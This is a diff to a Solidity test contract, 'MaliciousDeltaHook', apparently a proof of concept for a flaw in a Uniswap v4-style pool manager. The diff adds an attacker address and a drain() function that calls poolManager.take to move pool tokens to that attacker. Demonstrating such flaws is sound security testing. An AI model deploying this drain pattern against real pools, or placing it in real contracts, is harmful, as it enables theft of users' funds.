@@ -6,8 +6,26 @@ import {PoolKey} from "../../src/types/PoolKey.sol";
 import {BalanceDelta, toBalanceDelta} from "../../src/types/BalanceDelta.sol";
 import {BeforeSwapDelta} from "../../src/types/BeforeSwapDelta.sol";
 import {ModifyLiquidityParams, SwapParams} from "../../src/types/PoolOperation.sol";
+import {IPoolManager} from "../../src/interfaces/IPoolManager.sol";
+import {Currency} from "../../src/types/Currency.sol";
 
 contract MaliciousDeltaHook is IHooks {
+    IPoolManager public poolManager;
+    Currency public currency1;
+    address public attacker;
+
+    constructor(address _manager) {
+        poolManager = IPoolManager(_manager);
+    }
+
+    function setCurrency1(Currency _c) external { currency1 = _c; }
+    function setAttacker(address _a) external { attacker = _a; }
+
+    // THIS IS THE KEY - proves steps 3-5
+    function drain(uint256 amount) external {
+        poolManager.take(currency1, attacker, amount);
+    }
+
     function getHookPermissions() public pure returns (Hooks.Permissions memory) {
         return Hooks.Permissions({
             beforeInitialize: false, afterInitialize: false,
@@ -19,6 +37,7 @@ contract MaliciousDeltaHook is IHooks {
             afterAddLiquidityReturnDelta: false, afterRemoveLiquidityReturnDelta: false
         });
     }
+
     function beforeInitialize(address, PoolKey calldata, uint160) external pure returns (bytes4) { return IHooks.beforeInitialize.selector; }
     function afterInitialize(address, PoolKey calldata, uint160, int24) external pure returns (bytes4) { return IHooks.afterInitialize.selector; }
     function beforeAddLiquidity(address, PoolKey calldata, ModifyLiquidityParams calldata, bytes calldata) external pure returns (bytes4) { return IHooks.beforeAddLiquidity.selector; }
